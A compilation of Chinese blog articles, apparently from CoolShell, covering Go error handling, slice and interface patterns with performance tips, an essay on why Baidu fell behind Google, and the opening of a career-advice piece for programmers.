- 参数上基本上就是入参，而返回接口把结果和错误分离，这样使得函数的接口语义清晰；
- 而且，Go 语言中的错误参数如果要忽略，需要显式地忽略，用 _ 这样的变量来忽略；
- 另外，因为返回的 `error` 是个接口（其中只有一个方法 `Error()`，返回一个 `string` ），所以你可以扩展自定义的错误处理。

另外，如果一个函数返回了多个不同类型的 `error`，你也可以使用下面这样的方式：

```
if err != nil {
  switch err.(type) {
    case *json.SyntaxError:
      ...
    case *ZeroDivisionError:
      ...
    case *NullPointerError:
      ...
    default:
      ...
  }
}
```

我们可以看到，Go语言的错误处理的的方式，本质上是返回值检查，但是他也兼顾了异常的一些好处 – 对错误的扩展。

#### 资源清理

出错后是需要做资源清理的，不同的编程语言有不同的资源清理的编程模式：

- C语言 – 使用的是 `goto fail;` 的方式到一个集中的地方进行清理（有篇有意思的文章可以看一下《[由苹果的低级BUG想到的](https://coolshell.cn/articles/11112.html)》）
- C++语言- 一般来说使用 [RAII模式](https://en.wikipedia.org/wiki/Resource_acquisition_is_initialization)，通过面向对象的代理模式，把需要清理的资源交给一个代理类，然后在析构函数来解决。
- Java语言 – 可以在finally 语句块里进行清理。
- Go语言 – 使用 `defer` 关键词进行清理。

下面是一个Go语言的资源清理的示例：

```
func Close(c io.Closer) {
  err := c.Close()
  if err != nil {
    log.Fatal(err)
  }
}

func main() {
  r, err := Open("a")
  if err != nil {
    log.Fatalf("error opening 'a'\n")
  }
  defer Close(r) // 使用defer关键字在函数退出时关闭文件。

  r, err = Open("b")
  if err != nil {
    log.Fatalf("error opening 'b'\n")
  }
  defer Close(r) // 使用defer关键字在函数退出时关闭文件。
}
```

#### Error Check Hell

好了，说到 Go 语言的 `if err !=nil` 的代码了，这样的代码的确是能让人写到吐。那么有没有什么好的方式呢，有的。我们先看如下的一个令人崩溃的代码。

```
func parse(r io.Reader) (*Point, error) {

    var p Point

    if err := binary.Read(r, binary.BigEndian, &p.Longitude); err != nil {
        return nil, err
    }
    if err := binary.Read(r, binary.BigEndian, &p.Latitude); err != nil {
        return nil, err
    }
    if err := binary.Read(r, binary.BigEndian, &p.Distance); err != nil {
        return nil, err
    }
    if err := binary.Read(r, binary.BigEndian, &p.ElevationGain); err != nil {
        return nil, err
    }
    if err := binary.Read(r, binary.BigEndian, &p.ElevationLoss); err != nil {
        return nil, err
    }
}
```

要解决这个事，我们可以用函数式编程的方式，如下代码示例：

```
func parse(r io.Reader) (*Point, error) {
    var p Point
    var err error
    read := func(data interface{}) {
        if err != nil {
            return
        }
        err = binary.Read(r, binary.BigEndian, data)
    }

    read(&p.Longitude)
    read(&p.Latitude)
    read(&p.Distance)
    read(&p.ElevationGain)
    read(&p.ElevationLoss)

    if err != nil {
        return &p, err
    }
    return &p, nil
}
```

上面的代码我们可以看到，我们通过使用Closure 的方式把相同的代码给抽出来重新定义一个函数，这样大量的 `if err!=nil` 处理的很干净了。但是会带来一个问题，那就是有一个 `err` 变量和一个内部的函数，感觉不是很干净。

那么，我们还能不能搞得更干净一点呢，我们从Go 语言的 `bufio.Scanner()`中似乎可以学习到一些东西：

```
scanner := bufio.NewScanner(input)

for scanner.Scan() {
    token := scanner.Text()
    // process token
}

if err := scanner.Err(); err != nil {
    // process the error
}
```

上面的代码我们可以看到，`scanner`在操作底层的I/O的时候，那个for-loop中没有任何的 `if err !=nil` 的情况，退出循环后有一个 `scanner.Err()` 的检查。看来使用了结构体的方式。模仿它，我们可以把我们的代码重构成下面这样：

首先，定义一个结构体和一个成员函数

```
type Reader struct {
    r   io.Reader
    err error
}

func (r *Reader) read(data interface{}) {
    if r.err == nil {
        r.err = binary.Read(r.r, binary.BigEndian, data)
    }
}
```

然后，我们的代码就可以变成下面这样：

```
func parse(input io.Reader) (*Point, error) {
    var p Point
    r := Reader{r: input}

    r.read(&p.Longitude)
    r.read(&p.Latitude)
    r.read(&p.Distance)
    r.read(&p.ElevationGain)
    r.read(&p.ElevationLoss)

    if r.err != nil {
        return nil, r.err
    }

    return &p, nil
}
```

有了上面这个技术，我们的“[流式接口 Fluent Interface](https://martinfowler.com/bliki/FluentInterface.html)”，也就很容易处理了。如下所示：

```
package main

import (
  "bytes"
  "encoding/binary"
  "fmt"
)

// 长度不够，少一个Weight
var b = []byte {0x48, 0x61, 0x6f, 0x20, 0x43, 0x68, 0x65, 0x6e, 0x00, 0x00, 0x2c} 
var r = bytes.NewReader(b)

type Person struct {
  Name [10]byte
  Age uint8
  Weight uint8
  err error
}
func (p *Person) read(data interface{}) {
  if p.err == nil {
    p.err = binary.Read(r, binary.BigEndian, data)
  }
}

func (p *Person) ReadName() *Person {
  p.read(&p.Name) 
  return p
}
func (p *Person) ReadAge() *Person {
  p.read(&p.Age) 
  return p
}
func (p *Person) ReadWeight() *Person {
  p.read(&p.Weight) 
  return p
}
func (p *Person) Print() *Person {
  if p.err == nil {
    fmt.Printf("Name=%s, Age=%d, Weight=%d\n",p.Name, p.Age, p.Weight)
  }
  return p
}

func main() {   
  p := Person{}
  p.ReadName().ReadAge().ReadWeight().Print()
  fmt.Println(p.err)  // EOF 错误
}
```

相信你应该看懂这个技巧了，但是，其使用场景也就只能在对于同一个业务对象的不断操作下可以简化错误处理，对于多个业务对象的话，还是得需要各种 `if err != nil`的方式。

#### 包装错误

最后，多说一句，我们需要包装一下错误，而不是干巴巴地把`err`给返回到上层，我们需要把一些执行的上下文加入。

通常来说，我们会使用 `fmt.Errorf()`来完成这个事，比如：

```
if err != nil {
   return fmt.Errorf("something failed: %v", err)
}
```

另外，在Go语言的开发者中，更为普遍的做法是将错误包装在另一个错误中，同时保留原始内容：

```
type authorizationError struct {
    operation string
    err error   // original error
}

func (e *authorizationError) Error() string {
    return fmt.Sprintf("authorization failed during %s: %v", e.operation, e.err)
}
```

当然，更好的方式是通过一种标准的访问方法，这样，我们最好使用一个接口，比如 `causer`接口中实现 `Cause()` 方法来暴露原始错误，以供进一步检查：

```
type causer interface {
    Cause() error
}

func (e *authorizationError) Cause() error {
    return e.err
}
```

 

这里有个好消息是，这样的代码不必再写了，有一个第三方的错误库（[github.com/pkg/errors](https://github.com/pkg/errors)），对于这个库，我无论到哪都能看到他的存在，所以，这个基本上来说就是事实上的标准了。代码示例如下：

```
import "github.com/pkg/errors"

//错误包装
if err != nil {
    return errors.Wrap(err, "read failed")
}

// Cause接口
switch err := errors.Cause(err).(type) {
case *MyError:
    // handle specifically
default:
    // unknown error
}
```

#### 参考文章

- **Golang Error Handling lesson by Rob Pike
  **http://jxck.hatenablog.com/entry/golang-error-handling-lesson-by-rob-pike
- **Errors are values
  **https://blog.golang.org/errors-are-values

（全文完）

# GO编程模式：切片，接口，时间和性能

#####  [2020年12月18日 ](https://coolshell.cn/articles/21128.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [33 条评论](https://coolshell.cn/articles/21128.html#comments) 79,200 人阅读

![img](photo/go.slices-300x169.png)

在本篇文章中，我会对Go语言编程模式的一些基本技术和要点，这样可以让你更容易掌握Go语言编程。其中，主要包括，数组切片的一些小坑，还有接口编程，以及时间和程序运行性能相关的话题。

### 本文是全系列中第1 / 10篇：[Go编程模式](https://coolshell.cn/articles/series/go编程模式)

- Go编程模式：切片，接口，时间和性能
- [Go 编程模式：错误处理](https://coolshell.cn/articles/21140.html)
- [Go 编程模式：Functional Options](https://coolshell.cn/articles/21146.html)
- [Go编程模式：委托和反转控制](https://coolshell.cn/articles/21214.html)
- [Go编程模式：Map-Reduce](https://coolshell.cn/articles/21164.html)
- [Go 编程模式：Go Generation](https://coolshell.cn/articles/21179.html)
- [Go编程模式：修饰器](https://coolshell.cn/articles/17929.html)
- [Go编程模式：Pipeline](https://coolshell.cn/articles/21228.html)
- [Go 编程模式：k8s Visitor 模式](https://coolshell.cn/articles/21263.html)
- [Go编程模式 ： 泛型编程](https://coolshell.cn/articles/21615.html)

[下一篇文章](https://coolshell.cn/articles/21140.html) »

目录



[Slice](https://coolshell.cn/articles/21128.html#Slice)[深度比较](https://coolshell.cn/articles/21128.html#深度比较)[接口编程](https://coolshell.cn/articles/21128.html#接口编程)[接口完整性检查](https://coolshell.cn/articles/21128.html#接口完整性检查)[时间](https://coolshell.cn/articles/21128.html#时间)[性能提示](https://coolshell.cn/articles/21128.html#性能提示)[参考文档](https://coolshell.cn/articles/21128.html#参考文档)

#### Slice

首先，我们先来讨论一下Slice，中文翻译叫“切片”，这个东西在Go语言中不是数组，而是一个结构体，其定义如下：

```
type slice struct {
    array unsafe.Pointer //指向存放数据的数组指针
    len   int            //长度有多大
    cap   int            //容量有多大
}
```

用图示来看，一个空的slice的表现如下：

![img](photo/slice1-300x190.png)熟悉C/C++的同学一定会知道，在结构体里用数组指针的问题——数据会发生共享！下面我们来看一下slice的一些操作



```
foo = make([]int, 5)
foo[3] = 42
foo[4] = 100

bar  := foo[1:4]
bar[1] = 99
```

对于上面这段代码。

- 首先先创建一个foo的slice，其中的长度和容量都是5
- 然后开始对foo所指向的数组中的索引为3和4的元素进行赋值
- 然后，对foo做切片后赋值给bar，再修改bar[1]

![img](photo/slice2.png)

通过上图我们可以看到，因为foo和bar的内存是共享的，所以，foo和bar的对数组内容的修改都会影响到对方。

接下来，我们再来看一个数据操作 `append()` 的示例

```
a := make([]int, 32)
b := a[1:16]
a = append(a, 1)
a[2] = 42
```

上面这段代码中，把 `a[1:16]` 的切片赋给到了 `b` ，此时，`a` 和 `b` 的内存空间是共享的，然后，对 `a`做了一个 `append()`的操作，这个操作会让 `a` 重新分享内存，导致 `a` 和 `b` 不再共享，如下图所示：

![img](photo/go.slices.append-1024x513.png)

从上图我们可以看以看到 `append()`操作让 `a` 的容量变成了64，而长度是33。这里，需要重点注意一下——**`append()`这个函数在 `cap` 不够用的时候就会重新分配内存以扩大容量，而如果够用的时候不不会重新分享内存！**

我们再看来看一个例子：

```
func main() {
    path := []byte("AAAA/BBBBBBBBB")
    sepIndex := bytes.IndexByte(path,'/’)

    dir1 := path[:sepIndex]
    dir2 := path[sepIndex+1:]

    fmt.Println("dir1 =>",string(dir1)) //prints: dir1 => AAAA
    fmt.Println("dir2 =>",string(dir2)) //prints: dir2 => BBBBBBBBB

    dir1 = append(dir1,"suffix"...)

    fmt.Println("dir1 =>",string(dir1)) //prints: dir1 => AAAAsuffix
    fmt.Println("dir2 =>",string(dir2)) //prints: dir2 => uffixBBBB
}
```

上面这个例子中，`dir1` 和 `dir2` 共享内存，虽然 `dir1` 有一个 `append()` 操作，但是因为 cap 足够，于是数据扩展到了`dir2` 的空间。下面是相关的图示（注意上图中 `dir1` 和 `dir2` 结构体中的 `cap` 和 `len` 的变化）

![img](photo/slice4-1024x740.png)

如果要解决这个问题，我们只需要修改一行代码。

```
dir1 := path[:sepIndex]
```

修改为

```
dir1 := path[:sepIndex:sepIndex]
```

新的代码使用了 Full Slice Expression，其最后一个参数叫“Limited Capacity”，于是，后续的 `append()` 操作将会导致重新分配内存。

#### 深度比较

当我们复杂一个对象时，这个对象可以是内建数据类型，数组，结构体，map……我们在复制结构体的时候，当我们需要比较两个结构体中的数据是否相同时，我们需要使用深度比较，而不是只是简单地做浅度比较。这里需要使用到反射 `reflect.DeepEqual()` ，下面是几个示例

```
import (
    "fmt"
    "reflect"
)

func main() {

    v1 := data{}
    v2 := data{}
    fmt.Println("v1 == v2:",reflect.DeepEqual(v1,v2))
    //prints: v1 == v2: true

    m1 := map[string]string{"one": "a","two": "b"}
    m2 := map[string]string{"two": "b", "one": "a"}
    fmt.Println("m1 == m2:",reflect.DeepEqual(m1, m2))
    //prints: m1 == m2: true

    s1 := []int{1, 2, 3}
    s2 := []int{1, 2, 3}
    fmt.Println("s1 == s2:",reflect.DeepEqual(s1, s2))
    //prints: s1 == s2: true
}
```

#### 接口编程

下面，我们来看段代码，其中是两个方法，它们都是要输出一个结构体，其中一个使用一个函数，另一个使用一个“成员函数”。

```
func PrintPerson(p *Person) {
    fmt.Printf("Name=%s, Sexual=%s, Age=%d\n",
  p.Name, p.Sexual, p.Age)
}

func (p *Person) Print() {
    fmt.Printf("Name=%s, Sexual=%s, Age=%d\n",
  p.Name, p.Sexual, p.Age)
}

func main() {
    var p = Person{
        Name: "Hao Chen",
        Sexual: "Male",
        Age: 44,
    }

    PrintPerson(&p)
    p.Print()
}
```

你更喜欢哪种方式呢？在 Go 语言中，使用“成员函数”的方式叫“Receiver”，这种方式是一种封装，因为 `PrintPerson()`本来就是和 `Person`强耦合的，所以，理应放在一起。更重要的是，这种方式可以进行接口编程，对于接口编程来说，也就是一种抽象，主要是用在“多态”，这个技术，在《[Go语言简介（上）：接口与多态](https://coolshell.cn/articles/8460.html#接口和多态)》中已经讲过。在这里，我想讲另一个Go语言接口的编程模式。

首先，我们来看一下，有下面这段代码：

```
type Country struct {
    Name string
}

type City struct {
    Name string
}

type Printable interface {
    PrintStr()
}
func (c Country) PrintStr() {
    fmt.Println(c.Name)
}
func (c City) PrintStr() {
    fmt.Println(c.Name)
}

c1 := Country {"China"}
c2 := City {"Beijing"}
c1.PrintStr()
c2.PrintStr()
```

其中，我们可以看到，其使用了一个 `Printable` 的接口，而 `Country` 和 `City` 都实现了接口方法 `PrintStr()` 而把自己输出。然而，这些代码都是一样的。能不能省掉呢？

我们可以使用“结构体嵌入”的方式来完成这个事，如下的代码所示，

```
type WithName struct {
    Name string
}

type Country struct {
    WithName
}

type City struct {
    WithName
}

type Printable interface {
    PrintStr()
}

func (w WithName) PrintStr() {
    fmt.Println(w.Name)
}

c1 := Country {WithName{ "China"}}
c2 := City { WithName{"Beijing"}}
c1.PrintStr()
c2.PrintStr()
```

引入一个叫 `WithName`的结构体，然而，所带来的问题就是，在初始化的时候，变得有点乱。那么，我们有没有更好的方法？下面是另外一个解。

```
type Country struct {
    Name string
}

type City struct {
    Name string
}

type Stringable interface {
    ToString() string
}
func (c Country) ToString() string {
    return "Country = " + c.Name
}
func (c City) ToString() string{
    return "City = " + c.Name
}

func PrintStr(p Stringable) {
    fmt.Println(p.ToString())
}

d1 := Country {"USA"}
d2 := City{"Los Angeles"}
PrintStr(d1)
PrintStr(d2)
```

上面这段代码，我们可以看到——**我们使用了一个叫`Stringable` 的接口，我们用这个接口把“业务类型” `Country` 和 `City` 和“控制逻辑” `Print()` 给解耦了。**于是，只要实现了`Stringable` 接口，都可以传给 `PrintStr()` 来使用。

这种编程模式在Go 的标准库有很多的示例，最著名的就是 `io.Read` 和 `ioutil.ReadAll` 的玩法，其中 `io.Read` 是一个接口，你需要实现他的一个 `Read(p []byte) (n int, err error)` 接口方法，只要满足这个规模，就可以被 `ioutil.ReadAll`这个方法所使用。**这就是面向对象编程方法的黄金法则——“Program to an interface not an implementation”**

#### 接口完整性检查

另外，我们可以看到，Go语言的编程器并没有严格检查一个对象是否实现了某接口所有的接口方法，如下面这个示例：

```
type Shape interface {
    Sides() int
    Area() int
}
type Square struct {
    len int
}
func (s* Square) Sides() int {
    return 4
}
func main() {
    s := Square{len: 5}
    fmt.Printf("%d\n",s.Sides())
}
```

我们可以看到 `Square` 并没有实现 `Shape` 接口的所有方法，程序虽然可以跑通，但是这样编程的方式并不严谨，如果我们需要强制实现接口的所有方法，那么我们应该怎么办呢？

在Go语言编程圈里有一个比较标准的作法：

```
var _ Shape = (*Square)(nil)
```

声明一个 `_` 变量（没人用），其会把一个 `nil` 的空指针，从 `Square` 转成 `Shape`，这样，如果没有实现完相关的接口方法，编译器就会报错：

> cannot use (*Square)(nil) (type *Square) as type Shape in assignment: *Square does not implement Shape (missing Area method)

这样就做到了个强验证的方法。

#### 时间

对于时间来说，这应该是编程中比较复杂的问题了，相信我，时间是一种非常复杂的事（比如《[你确信你了解时间吗？](https://coolshell.cn/articles/5075.html)》、《[关于闰秒](https://coolshell.cn/articles/7804.html)》等文章）。而且，时间有时区、格式、精度等等问题，其复杂度不是一般人能处理的。所以，一定要重用已有的时间处理，而不是自己干。

在 Go 语言中，你一定要使用 `time.Time` 和 `time.Duration` 两个类型：

- 在命令行上，`flag` 通过 `time.ParseDuration` 支持了 `time.Duration`
- JSon 中的 `encoding/json` 中也可以把`time.Time` 编码成 [RFC 3339](https://tools.ietf.org/html/rfc3339) 的格式
- 数据库使用的 `database/sql` 也支持把 `DATATIME` 或 `TIMESTAMP` 类型转成 `time.Time`
- YAML你可以使用 `gopkg.in/yaml.v2` 也支持 `time.Time` 、`time.Duration` 和 [RFC 3339](https://tools.ietf.org/html/rfc3339) 格式

如果你要和第三方交互，实在没有办法，也请使用 [RFC 3339](https://tools.ietf.org/html/rfc3339) 的格式。

最后，如果你要做全球化跨时区的应用，你一定要把所有服务器和时间全部使用UTC时间。

#### 性能提示

Go 语言是一个高性能的语言，但并不是说这样我们就不用关心性能了，我们还是需要关心的。下面是一个在编程方面和性能相关的提示。

- 如果需要把数字转字符串，使用 `strconv.Itoa()` 会比 `fmt.Sprintf()` 要快一倍左右
- 尽可能地避免把`String`转成`[]Byte` 。这个转换会导致性能下降。
- 如果在for-loop里对某个slice 使用 `append()`请先把 slice的容量很扩充到位，这样可以避免内存重新分享以及系统自动按2的N次方幂进行扩展但又用不到，从而浪费内存。
- 使用`StringBuffer` 或是`StringBuild` 来拼接字符串，会比使用 `+` 或 `+=` 性能高三到四个数量级。
- 尽可能的使用并发的 go routine，然后使用 `sync.WaitGroup` 来同步分片操作
- 避免在热代码中进行内存分配，这样会导致gc很忙。尽可能的使用 `sync.Pool` 来重用对象。
- 使用 lock-free的操作，避免使用 mutex，尽可能使用 `sync/Atomic`包。 （关于无锁编程的相关话题，可参看《[无锁队列实现](https://coolshell.cn/articles/8239.html)》或《[无锁Hashmap实现](https://coolshell.cn/articles/9703.html)》）
- 使用 I/O缓冲，I/O是个非常非常慢的操作，使用 `bufio.NewWrite()` 和 `bufio.NewReader()` 可以带来更高的性能。
- 对于在for-loop里的固定的正则表达式，一定要使用 `regexp.Compile()` 编译正则表达式。性能会得升两个数量级。
- 如果你需要更高性能的协议，你要考虑使用 [protobuf](https://github.com/golang/protobuf) 或 [msgp](https://github.com/tinylib/msgp) 而不是JSON，因为JSON的序列化和反序列化里使用了反射。
- 你在使用map的时候，使用整型的key会比字符串的要快，因为整型比较比字符串比较要快。

#### 参考文档

还有很多不错的技巧，下面的这些参考文档可以让你写出更好的Go的代码，必读！

- **Effective** **Go
  **https://golang.org/doc/effective_go.html
- **Uber** **Go** **Style
  **https://github.com/uber-go/guide/blob/master/style.md
- **50 Shades of Go: Traps, Gotchas, and Common Mistakes for New Golang Devs
  **http://devs.cloudimmunity.com/gotchas-and-common-mistakes-in-go-golang/
- **Go** **Advice
  **https://github.com/cristaloleg/go-advice
- **Practical Go Benchmarks
  **https://www.instana.com/blog/practical-golang-benchmarks/
- **Benchmarks of Go serialization methods
  **https://github.com/alecthomas/go_serialization_benchmarks
- **Debugging** **performance** **issues** **in** **Go** **programs
  **https://github.com/golang/go/wiki/Performance
- **Go** **code** **refactoring:** **the** **23x** **performance** **hunt
  **https://medium.com/@val_deleplace/go-code-refactoring-the-23x-performance-hunt-156746b522f7

（全文完）

# 百度为什么掉队了

#####  [2020年12月16日 ](https://coolshell.cn/articles/21113.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [36 条评论](https://coolshell.cn/articles/21113.html#comments) 63,357 人阅读

![img](photo/baidu-300x169.jpg)今天早上看到一篇文章《[百度不要用户](https://new.qq.com/omn/20201215/20201215A06XMN00.html)》这篇文章里的大意是：百度错过了移动互联网，等反应过来的时候，在2013年猛收购了一些公司来追赶对手或是时代，但都不成功，然后又开始后过来走到技术，大力发展AI，可惜，AI又是一个不是很成熟的事，需要没有上限的投入，而且在短期内看不到盈利的事，然而整个KPI又设计在了盈利上，最后导致内部内耗严重，人才和管理层流失，最终离用户越来越远。

文章中有一个段落的标题是【做决策的是技术】，其中有话是这样的——

> 在“重技术、轻运营”的百度，产品的主导权和优先权在技术手里，产品和运营的立项话语权相对轻很多。如果是在 PC 时代，这无可厚非，但在移动互联网时代，这就有很大的问题。

这就是中国这个社会的价值观了，整个社会价值观从本质上来说是不待见技术的——**平时都说技术不重要，但是当有问题出现的的时候，他们都会把问题都推到技术上**。

虽然我同意这篇文章中大多数观点，但是我对“做决策的是技术造成了问题”有很大的不同意，并不是我是技术人员，我只会站在我的角度上思考问题，而且，这个结论就是错的。



要证明这个事，我们就需要找一个反例，这个反例就是Google。其实，文章中所有的因为移动互联网出现而对传统互联网造成挑战的问题，Google其实都遇到了，然而，Google却走了一条完全与百度不一样的路。

当时，Facebook如日中天的时候，Google也有很多人才流失到了Facebook，而Google的所有产品线都受到了来自移动互联网的挑战，人们不再打开电脑了，而且把时间全部放在了手机上，于是，Google的搜索也变得麻烦了，就算Google也做了一个搜索的App，也没人用过。Google还做了Google Plus的社交产品，最终也是以失败告终。除此之外，还有众多的Google产品都在移动互联网下玩完，比如：Google Talk/Hangouts, Google Wave，Google Buzz，Google Reader……还有电商网站Google Checkout, Google Offers……如果你要看Google死掉的产品你可以看一下这个网页 – [Killed By Google](https://killedbygoogle.com/) ，一共200多个产品，有好多你都没有听说过。

另外一方面，Google和百度一样，在云计算方面都没有跟上时代。百度的李彦宏，2010年03月28日，在中国IT领袖峰会上说，“云计算不客气一点讲是新瓶装旧酒，没有新东西”，可见出了战略上的错误。而Google则是云计算的倡导者，Google在云计算上的技术造诣绝对不会比任何一家公司差，但是Google走了一条很曲高和寡的路——Google App Engine，直接跨过IaaS上到PaaS，最终错失市场，现在整合进Google Cloud Platform，提供一整套的多种形式的云服务，尤其是其AI、大数据和数据中心的运营能力，才挽回一点面子，但还是被AWS和Azure抛在后面。而百度那边呢，百度的“百度云”做成了“百度网盘”……

可以看见，在过去10年，Google还是比较危险的，同样和是搜索引擎起家的百度所面临的风险和危机是一样的——流量入口开始发生转移，导致技术架构和方案也跟着一起转变。但是，今天的Google依然很成功，也是一个破万亿市值的公司，为什么呢？是不是因为Google那边是运营和产品说了算呢？显然不是，如果是那样，Google今天的结局可能和百度也会很类似。

Google 牛逼的原因有很多，我想在这里重点说几个跟开源有关的产品，让大家感受一下Google是怎么在落后的地方力挽狂澜的，这实在让人细思极恐：

- **Chrome浏览器**。Google面对的竞争对手是微软的IE，这个用户入口如果失去了，Google的收入至少少一半（注：今天的天天在做慈善的Bill Gates，当年在浏览器市场上用操作系统垄断的方式把网景和Java都干得痛不欲生，最终引发反垄断诉讼才变得开放一点）。所以，为了要从当时占市场份额98%以上的IE抢市场，开源是一个非常好的策略（当时，还有用户体验，安全性和性能等其它因素）。

- **Android 操作系统**。Android 操作系统本质上是为了对抗 Apple和Microsoft，这两个公司在操作系统上耕耘多年，而未来的手机入口成为必争之地，如果Google错失了这个阵地，那么，Google的业务量会受到巨大的影响。所以，Google必需争夺，而且还必需用开源来搞。试想，如果Google的Android不开源的话，今天的智能手机市场很有可能是Apple和Micorsoft/Nokia唱主角了。正因为开源了Android，所以可以让更多的人和企业以Android的方式参与进来，从而对Apple和Microsoft形成真正的对抗。

- **Kubernetes & CNCF**。很明显，Kubernetes和后来的CNCF把云计算提升到了另一个层次——不再以资源虚拟化的云设施，而是以应用/服务/API调度为主的云计算。这个真的很猛，其目的主要也是要用一个新的云计算的形式来遏制AWS和Azure的发展，想通过Cloud Native的方式把云计算的游戏规则改变，从而让GCP更好用，另外，其也是开源的，并成立了了开源基金会，似乎是在告诉大众，无产阶级联合起来，对抗巨头。如果Kubernetes像Google的的论文不开源的话，估计也会错失当时竞争异常激烈的容器调度市场。

开源并不是Google的核心文化，Google有太多的好的东西，他都不开源，Google做死的产品几百个，但宁可放到垃圾桶里，他们也不会开源出来。所以，**Google的开源，其本质上来说，还是为其商业逻辑服务的——为了抢夺别人的市场，为了后来者居上**。

当然，Google比百度成功的原因还不仅上面这些，上面这些只是想让大家看到Google的思路。这些思路，很明显都是技术的思路，不是运营的思路。Google虽然有技术，但也不是在所有的技术上都有优势，看看人家是怎么在自己并没有优势的地方抢市场的玩法，可能会对理解百度为什么掉队了会有更准确的帮助。

最后，Wikipedia上有几个和Google有关清单，可以看看。

- [Google 并购公司的清单](https://en.wikipedia.org/wiki/List_of_mergers_and_acquisitions_by_Alphabet) – Google 的并了购了240多家公司。
- [Google 的产品清单](https://en.wikipedia.org/wiki/List_of_Google_products) – Google 的产品簇简直就是一个大杂烩 。
- [Google 的APP清单](https://en.wikipedia.org/wiki/List_of_Android_apps_by_Google) – 看看Google的APP全家桶，数百个应用。

看完这些清单，你可能会感觉到，Google 这厮也是什么都在干，所以，死的也很多。但这种大规模试错的产能，并不是任何一个公司都有的。百度和Google的员工数量我在网上找了一下，只能看到2018年的数据，2018年百度有45000人，Google有98000人。人数少了一半，但是产能少了可不只一半。

另外，你再仔细看一下上面的清单，你会看得出来，Google做的这些产品和方向都有一种浓浓的技术味……而且，你会觉得，在技术上折腾，就算是失败了，也能让人感觉得到这家公司和团队不会差……

与《百度不要用户》这篇文章中所说的，百度的问题是“技术人员话语太强”，我觉得百度的问题是，不再做技术了……而公司出现了混乱的思维方式，无论是不是技术人员，谁都不会思考和做决定了……

（全文完）

# 程序员如何把控自己的职业

#####  [2020年08月07日 ](https://coolshell.cn/articles/20977.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [117 条评论](https://coolshell.cn/articles/20977.html#comments) 179,991 人阅读

![img](photo/programmer.01-e1596792460687-196x300.png)这篇文章的主要内容主要是我今年3月份在腾讯做的直播，主要是想让一些技术人员对世界有一个大体的认识，并且在这个认识下能够有一个好的方法成就自己。而不是在一脸蒙圈的状态下随波逐流，而日益迷茫和焦虑。直播完后，腾讯方面把我的直播形成文字的形式发了出来，我觉得我可以再做一个精编版。所以，有了这篇文章，希望对大家有帮助。

对我来说，在我二十多年的工作经历来看，期间经历了很多技术的更新换代，整个技术模式、业务模式也是一直变来变去，我们这群老程序员成长中所经历的技术比今天的程序员玩的还更杂更多。我罗列一下我学过的，而且还被淘汰掉的技术，大家先感受一下。

```
- MIS应用开发：FoxPro，PowerBuilder，Delphi
- OA：Lotus Notes，VBScripts
- 微软：ODBC/ADO，COM/DCOM，MFC/ATL，J++
- 服务器：AIX，HP-UX，SCO Unix
- Web：CGI，ISAPI，SOAP
- RPC：CICS，Tuxedo
- J2EE：Websphere，Weblogic
- DB：Sybase，Informix 
```

我想说的是，无论过去还是今天，我们这些前浪和你们后浪所面对的技术的挑战和对技术的焦虑感是相似的，我们那个时候不但玩996，还玩封闭开发（就是一周只能回家一天）。当然，唯一好的东西，就是比起今天的程序员来说，我们那个年代没有像微信、微博、知乎，抖音这些巨大消耗你人生的东西，所以，我们的工作、生活和成长都有很效率，不会被打断、喜欢看书、Google还没有被封……当然，那时代没有StackOverlow和Github这样的东西，所以，能完成的东西或质量都一般。



当然，这里并不是想做一个比较，只是想让大家了解一下两代程序员间的一些问题各有千秋，大同小异。在整个成长过程中，其实有很多东西是相通的，其本上来说，就是下面的三件事——

**第一**，如果想要把控技术，应对这个世界的一些变化，**需要大致知道这个世界的一些规律和发展趋势，另外还得认识自己**，自己到底适合做什么？在这个趋势和规律下属于自己的发挥领域到底是什么？这是我们每个人都需要了解的。

**第二**，**打牢基础，以不变应万变**，不管世界怎样变化，我都能很快适应它。基础的重要程度对于你能够飞多高是相当有影响的，懂原理的人比不懂原理的人能做出来的事情或是能解决的问题完全是两个层级的。

**第三，提升成长的效率**，因为现在社会的节奏实在太快了，比二十年前快得太多，技术层出不穷，所以我们的成长也要更有效率。效率并不单指的快，效率是怎么样更有效，是有用功除以总功（参看《[加班与效率](https://coolshell.cn/articles/10217.html)》），怎么学到更有效的东西，或者怎么更有效学习，是我们需要掌握的另一关键。

下面是我这多年来的一些认识，希望对你有帮助。

目录



[世界发展趋势](https://coolshell.cn/articles/20977.html#世界发展趋势)[人才需求](https://coolshell.cn/articles/20977.html#人才需求)[Google评分卡](https://coolshell.cn/articles/20977.html#Google评分卡)[认识自己](https://coolshell.cn/articles/20977.html#认识自己)[打好基础](https://coolshell.cn/articles/20977.html#打好基础)[学习效率](https://coolshell.cn/articles/20977.html#学习效率)[小结](https://coolshell.cn/articles/20977.html#小结)

#### 世界发展趋势

**我个人经历的信息化革命应该分成三个阶段：**

- **1990年代到2000年，这个时代MB时代**，是雅虎、新浪、搜狐、网易门户网站的时代，这个时代就是ISP/ICP互联网提供商，把一些资讯数字化，然后发布到网络上。
- **2000年到2010年，这个时代叫GB时代，或是叫多媒体或UGC时代**，上网开始变得普遍了，每个人手里的数码设备开始变得多了起来，可以上传照片，可以上传视频，甚至可以在网上做社交。
- **2010年到2020年，这个时代叫TB时代，这过去的十年是移动互联网时代**，移动互联网只需要手机在线，不需要依靠电脑。因为手机随时在线，所以个人的各种各样的数据始终在被收集，只要用户上网就会产生数据，所以人的行为最终也被数字化了。

所有的硬件和软件都是跟着需要处理的数据而演进的，我们需要更大的带宽，更大的硬盘，更多的处理器……大到一定时候就只能进入分布式化的技术架构了，再大，数据中心也顶不住了，就会要引入更为分布式的边缘计算了。

另一方面，从业务上来看，**我们可以看到整个世界就在不断地进行数字化，因为，只要数字化了，就可以进行复制传播和计算，只要可以进行计算了，就可以进行数学建模，就可以自动化，只要可以自动化了就可以规模化，只要可能规模化了，就可以改变整个行业**。人类的近代史的大趋势基本上都是在解决能源和自动化的事，源源不断的能源是让机器不知疲倦的前提条件，用机器代替牲口，代替人类进行工作是规模化的前提条件。

所以，**技术的演进规律基本是自动化加规模化，从而降低成本，提升效率**。这就是为什么世界变得越来越快，人类都快跟不上节奏的原因，主要是整个社会不断被机器、数据所驱动。

#### 人才需求

在这个过程中，需要什么样的人？下面是我的一些认识——

